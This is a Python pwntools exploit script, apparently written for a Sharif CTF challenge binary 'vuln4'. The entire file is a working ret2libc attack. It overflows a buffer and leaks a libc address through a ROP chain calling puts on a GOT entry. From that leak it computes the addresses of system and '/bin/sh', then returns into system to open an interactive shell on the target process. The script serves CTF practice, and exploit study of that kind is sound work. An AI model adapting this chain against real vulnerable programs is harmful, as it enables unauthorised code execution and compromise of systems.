#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")
context.log_level = "DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./vuln4")
        self.libc = ELF("./libc.so.6")
        self.p = None

    def leak_addr(self):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        puts_plt = self.e.plt['puts']
        puts_got = self.e.got['strcpy']

        rop.raw("A" * 21)
        rop.raw(p32(puts_plt))
        rop.raw(p32(main))
        rop.raw(p32(puts_got))

        self.p.sendline(str(rop))
        data = self.p.recvuntil("yourself\n")
        data = data[:4]
        print "[x] Leak " + str(len(data)) + " bytes at " + hex(puts_got) + " : " + ":".join("{:02x}".format(ord(c)) for c in data)
        return u32(data)

    def start_binary(self):
        self.p = process("./vuln4", env={
            "LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")
        })
#        self.p = remote("ctf.sharif.edu", 4801)
        self.p.recvuntil("yourself\n")

    def execute_system(self, leak_binsh, leak_system):
        rop = ROP([self.e])

        rop.raw("A" * 21)
        rop.raw(p32(leak_system))
        rop.raw(p32(leak_system))
        rop.raw(p32(leak_binsh))

        self.p.send(str(rop))
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()
        leak_system = self.leak_addr() - 0x4c070
        leak_binsh = leak_system + 0x120c6b
        self.execute_system(leak_binsh, leak_system)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
